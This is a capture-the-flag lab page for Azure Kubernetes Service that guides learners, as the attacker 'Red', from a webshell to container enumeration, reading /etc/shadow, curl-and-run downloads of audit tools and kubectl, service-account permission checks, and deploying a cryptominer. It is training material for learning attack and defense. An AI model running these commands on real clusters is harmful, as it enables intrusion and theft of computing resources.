
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../azure/">
      
      
        <link rel="next" href="../scenario_1_defense/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.17">
    
    
      
        <title>Scenario 1 Attack - AKS Capture the Flag</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.bcfcd587.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#free-compute-scenario-1-attack" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="AKS Capture the Flag" class="md-header__button md-logo" aria-label="AKS Capture the Flag" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            AKS Capture the Flag
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Scenario 1 Attack
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/lastcoolnameleft/aks-ctf" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lastcoolnameleft/aks-ctf
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="AKS Capture the Flag" class="md-nav__button md-logo" aria-label="AKS Capture the Flag" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>

    </a>
    AKS Capture the Flag
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/lastcoolnameleft/aks-ctf" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lastcoolnameleft/aks-ctf
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Getting Started
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Scenario 1 Attack
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Scenario 1 Attack
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#warning" class="md-nav__link">
    <span class="md-ellipsis">
      Warning
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#backstory" class="md-nav__link">
    <span class="md-ellipsis">
      Backstory
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Backstory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#name-red" class="md-nav__link">
    <span class="md-ellipsis">
      Name: Red
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#motivations" class="md-nav__link">
    <span class="md-ellipsis">
      Motivations
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../scenario_1_defense/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scenario 1 Defense
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../scenario_2_attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scenario 2 Attack
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../scenario_2_defense/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scenario 2 Defense
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_challenges/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus Challenges
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_hints/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus Challenge Hints
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_1_walkthrough/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus 1 Walkthrough
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../bonus_2_walkthrough/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bonus 2 Walkthrough
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../wrapup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wrap Up
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#warning" class="md-nav__link">
    <span class="md-ellipsis">
      Warning
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#backstory" class="md-nav__link">
    <span class="md-ellipsis">
      Backstory
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Backstory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#name-red" class="md-nav__link">
    <span class="md-ellipsis">
      Name: Red
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#motivations" class="md-nav__link">
    <span class="md-ellipsis">
      Motivations
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="free-compute-scenario-1-attack">Free Compute: Scenario 1 Attack<a class="headerlink" href="#free-compute-scenario-1-attack" title="Permanent link">&para;</a></h1>
<h2 id="warning">Warning<a class="headerlink" href="#warning" title="Permanent link">&para;</a></h2>
<p>In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.</p>
<p>In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.</p>
<h2 id="backstory">Backstory<a class="headerlink" href="#backstory" title="Permanent link">&para;</a></h2>
<h3 id="name-red">Name: <strong>Red</strong><a class="headerlink" href="#name-red" title="Permanent link">&para;</a></h3>
<ul>
<li>Opportunist</li>
<li>Easy money via crypto-mining</li>
<li>Uses automated scans of web IP space for specific issues</li>
<li>Leverages off-the-shelf attacks</li>
<li>Basic Kubernetes knowledge</li>
</ul>
<h3 id="motivations">Motivations<a class="headerlink" href="#motivations" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>Red</strong>â€™s intrusion-as-a-service provider compromises website and uploads a webshell</li>
<li><strong>Red</strong> gets the URL of the webshell and wants to deploy some crypto-miners</li>
</ul>
<h2 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
<p><strong>Red</strong> has been mining <code>bitcoinero</code> for a few months now, and it's starting to gain some value.  To capitalize on this bubble, <strong>Red</strong> uses a service that sells shell access to expand the mining pool.  To find the compromised website, run the following from your Cloud Shell terminal:</p>
<h1 id="issue-previous-tool-used-nodeport-instead-of-lb-validate-no-issues-with-lb">ISSUE: Previous tool used NodePort instead of LB.  Validate no issues with LB<a class="headerlink" href="#issue-previous-tool-used-nodeport-instead-of-lb-validate-no-issues-with-lb" title="Permanent link">&para;</a></h1>
<div class="highlight"><pre><span></span><code><span class="go">./attack-1-helper.sh</span>
</code></pre></div>
<p>Log into the URL in a browser, and you should be looking at a working web terminal.</p>
<p><img alt="webshell screenshot" src="../img/webshell.png" /></p>
<h2 id="thinking-in-graphs">Thinking In Graphs<a class="headerlink" href="#thinking-in-graphs" title="Permanent link">&para;</a></h2>
<p>Attacking a system is a problem-solving process similar to troubleshooting: <strong>Red</strong> begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.</p>
<p>The general process looks like this:</p>
<p><img alt="attack lifecycle" src="../img/attack-lifecycle.png" /></p>
<ul>
<li>
<p><strong>Study</strong></p>
<p>In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, <code>nmap</code> is commonly used to enumerate IP networks. <code>nikto</code>, <code>burp</code>, and <code>sqlmap</code> are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as <code>uname</code>, <code>winver</code>, and <code>netstat</code> provide a wealth of information about their host OSes.</p>
</li>
<li>
<p><strong>Plan</strong></p>
<p>In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.</p>
</li>
<li>
<p><strong>Attack Something</strong></p>
<p>In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.</p>
</li>
<li>
<p><strong>Persist</strong></p>
<p>In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.</p>
</li>
<li>
<p><strong>Win</strong></p>
<p>Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.</p>
</li>
</ul>
<h2 id="getting-some-loot">Getting Some Loot<a class="headerlink" href="#getting-some-loot" title="Permanent link">&para;</a></h2>
<p>Since <strong>Red</strong> already has a shell on a compromised host (Thanks, Natoshi!), the process is fairly simple. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible:</p>
<p>Let's become <strong>Red</strong> and try some basic information-gathering commands to get a feel for the environment:</p>
<p><div class="highlight"><pre><span></span><code><span class="go">id</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">uname -a</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">cat /etc/lsb-release /etc/redhat-release</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">ps -ef</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">df -h</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">netstat -nl</span>
</code></pre></div></p>
<p>Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container.</p>
<p>Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank">a basic Linux config auditor</a> to see if it finds any obvious opportunities. Search a bit on <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> to see if there's easy public exploits for the kernel.</p>
<p><div class="highlight"><pre><span></span><code><span class="go">cat /etc/shadow</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">ls -l /home</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">ls -l /root</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard</span>
</code></pre></div></p>
<p>That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:</p>
<div class="highlight"><pre><span></span><code><span class="go">cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained</span>
</code></pre></div>
<p>This tells us several things:</p>
<ul>
<li>We are in a container, and it's managed by Kubernetes</li>
<li>Some security features are not in use (userns)</li>
<li>Seccomp is disabled, but a number of Syscalls are blocked</li>
<li>We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a></li>
</ul>
<p>Now let's inspect our Kubernetes environment:</p>
<p><div class="highlight"><pre><span></span><code><span class="go">env | grep -i kube</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">ls /var/run/secrets/kubernetes.io/serviceaccount</span>
</code></pre></div></p>
<p>We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:</p>
<p><div class="highlight"><pre><span></span><code><span class="go">export PATH=/tmp:$PATH</span>
<span class="go">cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">kubectl get all</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">kubectl get all -A</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="go">kubectl get namespaces</span>
</code></pre></div></p>
<p>By default, kubectl will attempt to use the default service account in <code>/var/run/secrets/kubernetes.io/serviceaccount</code> -- and it looks like this one has some API access. Note that we can't see anything outside our namespace, though.</p>
<p>Let's inspect what all we <strong>can</strong> do:</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl auth can-i --list</span>
</code></pre></div>
<p>Can we create pods in this and other namespaces?</p>
<div class="highlight"><pre><span></span><code><span class="go">kubectl auth can-i create pods</span>
<span class="go">kubectl auth can-i create pods -n dev</span>
<span class="go">kubectl auth can-i create pods -n prd</span>
<span class="go">kubectl auth can-i create pods -n kube-system</span>
</code></pre></div>
<p>Happy day! Our service account is admin in our pod's namespace! Maybe the dashboard on port 31337 needs that much access? Anyway, this gives us what we need to achieve our goals.</p>
<div class="highlight"><pre><span></span><code><span class="go">cd /tmp; cat &gt; bitcoinero.yml &lt;&lt;EOF</span>
<span class="go">apiVersion: apps/v1</span>
<span class="go">kind: Deployment</span>
<span class="go">metadata:</span>
<span class="go">  labels:</span>
<span class="go">    run: bitcoinero</span>
<span class="go">  name: bitcoinero</span>
<span class="go">  namespace: dev</span>
<span class="go">spec:</span>
<span class="go">  replicas: 1</span>
<span class="go">  revisionHistoryLimit: 2</span>
<span class="go">  selector:</span>
<span class="go">    matchLabels:</span>
<span class="go">      run: bitcoinero</span>
<span class="go">  strategy:</span>
<span class="go">    rollingUpdate:</span>
<span class="go">      maxSurge: 25%</span>
<span class="go">      maxUnavailable: 25%</span>
<span class="go">    type: RollingUpdate</span>
<span class="go">  template:</span>
<span class="go">    metadata:</span>
<span class="go">      labels:</span>
<span class="go">        run: bitcoinero</span>
<span class="go">    spec:</span>
<span class="go">      containers:</span>
<span class="go">      - image: securekubernetes/bitcoinero:latest</span>
<span class="go">        name: bitcoinero</span>
<span class="go">        command: [&quot;./moneymoneymoney&quot;]</span>
<span class="go">        args:</span>
<span class="go">        - -c</span>
<span class="go">        - &quot;1&quot;</span>
<span class="go">        - -l</span>
<span class="go">        - &quot;10&quot;</span>
<span class="go">        resources:</span>
<span class="go">          requests:</span>
<span class="go">            cpu: 100m</span>
<span class="go">            memory: 128Mi</span>
<span class="go">          limits:</span>
<span class="go">            cpu: 200m</span>
<span class="go">            memory: 128Mi </span>
<span class="go">EOF</span>

<span class="go">./kubectl apply -f bitcoinero.yml</span>
<span class="go">sleep 10</span>
<span class="go">./kubectl get pods</span>
</code></pre></div>
<p>We can see the bitcoinero pod running, starting to generate us a small but steady stream of cryptocurrency.</p>
<p><em>MISSION ACCOMPLISHED</em></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/lastcoolnameleft/aks-ctf" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.1e8ae164.min.js"></script>
      
    
  </body>
</html>